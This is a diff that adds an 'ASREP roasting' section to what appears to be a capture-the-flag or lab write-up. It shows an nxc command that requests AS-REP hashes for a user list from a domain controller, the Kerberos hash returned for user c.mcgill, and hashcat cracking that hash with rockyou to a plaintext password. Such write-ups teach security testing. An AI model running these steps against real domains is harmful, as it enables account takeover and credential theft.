@@ -346,3 +346,23 @@ So using `--rid-brute` i can dump all the users!
 
 Ill edit this output a bit to make a user list!
 
+# ASREP roasting
+
+So now i have a valid user list i can try some as-rep roasting
+
+```python
+nxc ldap dc.northstone.local -u users.txt -p '' --asreproast asrep.hash                                       
+LDAP        10.1.209.181    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (signing:None) (channel binding:Never) 
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+LDAP        10.1.209.181    389    DC               $krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:250dff6930ccb4c916b488ecf7310662$0dea9dd5626575cee048b9e8c7a027e20a82c22197b1cc09d654bbebb41c231ad6f2a622f356e68ddabd4bf9fa417438740f272275427e9cc4beb792db1e9058a3dfad0f9fd913aaf1e785607c5b6f31a25538ac327b6d5955695bc58e4e7f3bb8d00676a8a2ec73ad6d2c4b47ec146cdfad07630872974ab2d14821d82c10186df408241f7975840cc72f1c88e44b1b5fcd48884dc32fbe8e0d40d65b7ff54e634c02f34c44e1e9d116556035e1278f7c40635747bfb9bfd586dd58c1265b131ecd3cd819e8497e412c6b25173e536a8160130af63eeb0756628a801d404201a6d49873d23e2f682f8d2733aa24d97eee430373
+```
+
+I have a hash
+
+```python
+hashcat asrep.hash /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:250dff6930ccb4c916b488ecf7310662$0dea9dd5626575cee048b9e8c7a027e20a82c22197b1cc09d654bbebb41c231ad6f2a622f356e68ddabd4bf9fa417438740f272275427e9cc4beb792db1e9058a3dfad0f9fd913aaf1e785607c5b6f31a25538ac327b6d5955695bc58e4e7f3bb8d00676a8a2ec73ad6d2c4b47ec146cdfad07630872974ab2d14821d82c10186df408241f7975840cc72f1c88e44b1b5fcd48884dc32fbe8e0d40d65b7ff54e634c02f34c44e1e9d116556035e1278f7c40635747bfb9bfd586dd58c1265b131ecd3cd819e8497e412c6b25173e536a8160130af63eeb0756628a801d404201a6d49873d23e2f682f8d2733aa24d97eee430373:chuck102213
+```
+
